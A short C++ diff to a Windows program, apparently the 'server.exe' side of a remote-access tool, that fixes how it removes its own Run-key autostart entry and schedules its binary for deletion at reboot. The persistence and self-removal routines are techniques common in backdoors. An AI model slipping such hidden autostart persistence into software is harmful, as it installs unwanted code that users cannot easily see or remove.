@@ -82,6 +82,7 @@ void AddtoStartup(){
     std::string filename ="\\";
     char system[MAX_PATH];
     extern char pathtofile[MAX_PATH];
+    extern const string RegistryKeyName;
 
     //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
     HMODULE GetModH = GetModuleHandle(NULL);
@@ -113,13 +114,16 @@ void AddtoStartup(){
 
 void RemoveFromStartup(){
 
-    HKEY hkey;
+    extern char pathtofile[MAX_PATH];
+    extern const string RegistryKeyName;
 
-    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hkey );
+    HKEY hKey;
 
-    RegDeleteKey(hkey, RegistryKeyName.c_str());
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
 
-    RegCloseKey(hkey);
+    RegDeleteValue(hKey, RegistryKeyName.c_str());
+
+    RegCloseKey(hKey);
 
     MoveFileEx(pathtofile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 
